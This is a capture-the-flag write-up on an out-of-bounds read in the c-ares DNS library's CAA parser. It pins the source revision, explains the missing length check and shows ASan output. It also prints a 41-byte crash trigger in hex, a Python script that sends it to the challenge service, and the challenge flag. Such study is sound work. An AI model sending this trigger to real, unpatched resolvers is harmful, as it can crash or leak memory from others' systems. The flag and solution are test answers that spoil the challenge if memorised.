---
title: "VULN#003"
category: "Vuln Research"
tags: ["c-ares", "dns", "caa", "out-of-bounds-read", "heap-buffer-overflow", "crash-oracle"]
solve_date: "2026-10-21T20:00:00+07:00"
language: "en"
points: 40
---

# VULN#003 — c-ares CAA parser reads two bytes past a zero-length RDATA

**Flag:** `CTF{7be3ffc6c7dd708e925627551706e233}`
**Service:** `169.58.126.107:7028`
**Flag format:** `CTF{}`

| Artifact | Bytes | Note |
|---|---:|---|
| `c-ares-src.tar.gz` | 374,950 | supplied source tree, c-ares at `89e9eeb4` |
| `Z1_caa_rdlen0.bin` | 41 | trigger message |

## Challenge

> VULN#003 — 40 points. A DNS response inspection service parses whatever DNS reply you send it. You are given the exact source tree the target binary is built from.

The handout is a `c-ares-src.tar.gz` archive of the c-ares resolver library. The remote service listens on
TCP and takes a 4-byte big-endian length followed by that many raw bytes, which it parses as a DNS response.
It answers with a single status line — `bad length`, `not valid`, `no effect`, `insufficient` or `confirmed` —
and only the intended memory-safety finding returns the flag.

## Analysis

### Service protocol

The framing was established by probing:

```text
text           -> b'status: bad length\n'
http           -> b'status: bad length\n'
2byte-A 44     -> b'status: bad length\n'
4byte-A 44     -> b'status: no effect\n'
R_8192 sent=8261 -> status: bad length
```

So the prefix is 4-byte big-endian, not the 2-byte DNS/TCP prefix. The size limit sits between the largest
accepted probe (8097 bytes) and the first rejected one (8261 bytes). The service is also rate limited —
roughly one request per minute — so every probe series was paced with a ~68 s gap and retried on
`rate limited`.

The verdicts themselves turned out to be an application-level classification, not a raw c-ares return code.
A fingerprint table of 14 parsers × 24 messages showed that no single parser's status explained the observed
answers. The model that fit was: `not valid` means the RR type or question type is unsupported by the
application (35/NAPTR, 99) or the structural walk failed (`qdcount != 1`, truncated message); `no effect`
means a supported type (1, 2, 5, 6, 15, 16, 28, 33, 257) parsed without incident. CAA (257) was in the
supported set.

### Locating the exact revision

Every file in the tarball was hashed as a git blob and matched against an upstream c-ares clone. At commit
`89e9eeb4` 87 of 89 files are byte-identical; the only mismatches are `CMakeLists.txt` and `Makefile.am`,
which differ because of duplicate basenames in the build. That pins the tree to:

```text
4d6975b3 2020-09-28 19:39:03 -0400 Fix OSSFuzz reported issue in CAA reply parsing
89e9eeb4 2020-09-26 11:05:22 -0400 fuzz CAA parsing (#363)
f5b4c085 2020-09-26 07:47:06 -0400 Allow parsing of CAA Resource Record (#360)
```

The supplied tree sits two days after CAA parsing was added and two days before its first security fix.

### The bug

`src/lib/ares_parse_caa_reply.c` reads the CAA `critical` flag and the tag length before it has checked that
the RDATA is at least two bytes long:

```c
      /* Check if we are really looking at a CAA record */
      if ((rr_class == C_IN || rr_class == C_CHAOS) && rr_type == T_CAA)
        {
          strptr = aptr;
          ...
          caa_curr->critical = (int)*strptr++;  
          caa_curr->plength = (int)*strptr++;
          if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)
            {
              status = ARES_EBADRESP;
              break;
            }
```

The RR bounds check earlier in the loop only rejects RDATA that extends past the end of the message:

```c
      rr_len = DNS_RR_LEN (aptr);
      aptr += RRFIXEDSZ;
      if (aptr + rr_len > abuf + alen)
        {
          status = ARES_EBADRESP;
          break;
        }
```

With `rr_len == 0` and the record placed at the very end of the message, `aptr == abuf + alen`, so the check
passes. Lines 139 and 140 then dereference `strptr[0]` and `strptr[1]` (with `strptr == aptr`), both of which
are outside the message buffer. The `plength` sanity check runs only after those two reads, and its
`rr_len - 2` term is signed arithmetic that goes negative for `rr_len < 2`, so it cannot recover.

### The fix

Commit `4d6975b3ec24aba44331d235bbcabf899be56cf2` adds the missing length guard:

```diff
           caa_last = caa_curr;
-
-          caa_curr->critical = (int)*strptr++;  
+          if (rr_len < 2)
+            {
+              status = ARES_EBADRESP;
+              break;
+            }
+          caa_curr->critical = (int)*strptr++;
           caa_curr->plength = (int)*strptr++;
           if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)
```

The commit message cites OSS-Fuzz issue 26012, reported by David Drysdale, as a *use-of-uninitialized-value*.
Built with ASan, the same read shows up as a heap-buffer-overflow.

### Reproducing locally

A harness was written that copies the input into an exact-size heap buffer (`malloc(n)`) and calls every
c-ares reply parser on it, then built against a static `libcares.a` configured with
`-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1` in a `gcc:13` container. Shape-directed
fuzzing (several rounds of 300k–500k generated messages, including tiny `rdlength` values and pointers into
RDATA) produced:

```text
==2996==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400001dbf9
READ of size 1 at 0x60400001dbf9 thread T0
    #0 0x41abd6 in ares_parse_caa_reply /work/src/lib/ares_parse_caa_reply.c:139
    #1 0x4050d9 in run_parsers /work/harness/fuzz_harness.c:105
    #2 0x40af75 in main /work/harness/fuzz_harness.c:386

0x60400001dbf9 is located 0 bytes after 41-byte region [0x60400001dbd0,0x60400001dbf9)
allocated by thread T0 here:
    #0 0x770980c303ef in malloc (/usr/local/lib64/libasan.so.8+0xdb3ef)
    #1 0x40aeaa in main /work/harness/fuzz_harness.c:382

SUMMARY: AddressSanitizer: heap-buffer-overflow /work/src/lib/ares_parse_caa_reply.c:139 in ares_parse_caa_reply
```

## Solution

### 1. Build the minimal trigger

The 41-byte message is a normal `example.com/CAA` response with a single CAA answer whose `rdlength` is zero
and which ends exactly at the end of the buffer:

| Offset | Bytes | Field |
|---:|---:|---|
| 0x00 | 2 | ID `0xabcd` |
| 0x02 | 2 | flags `0x8180` |
| 0x04 | 2 | QDCOUNT 1 |
| 0x06 | 2 | ANCOUNT 1 |
| 0x08 | 4 | NSCOUNT 0, ARCOUNT 0 |
| 0x0c | 13 | `example.com` (length-prefixed labels + root) |
| 0x19 | 4 | QTYPE 257, QCLASS 1 |
| 0x1d | 2 | answer name `0xc00c` |
| 0x1f | 2 | TYPE `0x0101` (257, CAA) |
| 0x21 | 2 | CLASS 1 |
| 0x23 | 4 | TTL 300 |
| 0x27 | 2 | RDLENGTH 0 |

```text
abcd81800001000100000000076578616d706c6503636f6d0001010001c00c010100010000012c0000
```

The whole record is exactly 41 bytes, so the zero-length RDATA sits at `abuf + alen` and both `*strptr++`
reads fall outside the allocation.

### 2. Choose the right RDATA length

The neighbouring lengths behave differently, both locally and remotely:

| Message | RDLENGTH | Local ASan | Remote |
|---|---:|---|---|
| `Z1_caa_rdlen0` | 0 | overflow at `:139` | `status: confirmed` + flag |
| `Z2_caa_rdlen1` | 1 | overflow at `:140` | `status: insufficient` |
| `Z3_caa_rdlen2` | 2 | no crash (`caa_reply=10`) | not sent |

With one byte of RDATA only the second read is out of bounds; the oracle treats that as `insufficient`.
The zero-length RDATA is the variant that puts both reads past the end.

## Exploit code

```python
import socket, struct

HOST, PORT = "169.58.126.107", 7028


def qname(name):
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"


header = struct.pack("!HHHHHH", 0xABCD, 0x8180, 1, 1, 0, 0)
question = qname("example.com") + struct.pack("!HH", 257, 1)     # CAA, IN
answer = (
    b"\xc0\x0c"                                                    # name -> question
    + struct.pack("!HHIH", 257, 1, 300, 0)                         # CAA, IN, ttl 300, rdlength 0
)
msg = header + question + answer
assert len(msg) == 41

s = socket.create_connection((HOST, PORT), timeout=15)
s.sendall(struct.pack("!I", len(msg)) + msg)
print(s.recv(4096).decode())
```

## Result

Probe log line from the paced series:

```text
Z1_caa_rdlen0            len=41    -> status: confirmed\x0aFLAG: CTF{7be3ffc6c7dd708e925627551706e233}\x0a [62B]
Z2_caa_rdlen1            len=42    -> status: insufficient\x0a [21B]
```

Independent re-send of the same 41-byte message:

```text
payload hex: abcd81800001000100000000076578616d706c6503636f6d0001010001c00c010100010000012c0000
attempt 0 -> b'status: confirmed\nFLAG: CTF{7be3ffc6c7dd708e925627551706e233}\n'
```

## Notes

- The bug is two days old at the supplied revision: CAA parsing landed in `f5b4c085` on 2020-09-26 and was
  patched in `4d6975b3` on 2020-09-28.
- The upstream OSS-Fuzz report is a use-of-uninitialized-value; the same two reads are a heap-buffer-overflow
  under ASan. Both describe the same missing `rr_len < 2` check.
- A one-byte RDATA gives only a one-byte over-read and the service answers `insufficient`, so the RDATA has
  to be empty, not merely short.
- The service dispatches on RR type itself, which is why the fingerprinting step mattered: an earlier
  hypothesis that the service called the NAPTR parser was wrong, and NAPTR answers were rejected as
  `not valid`.
- Requests are rate limited to about one per minute; every probe used a ~68 s gap with retry on
  `rate limited`.

## References

- c-ares `src/lib/ares_parse_caa_reply.c` at `89e9eeb4efbd4ad487ef9c9debbe9920e7b3b236`
- c-ares commit `4d6975b3ec24aba44331d235bbcabf899be56cf2` — "Fix OSSFuzz reported issue in CAA reply parsing"
- OSS-Fuzz issue 26012 — <https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=26012>
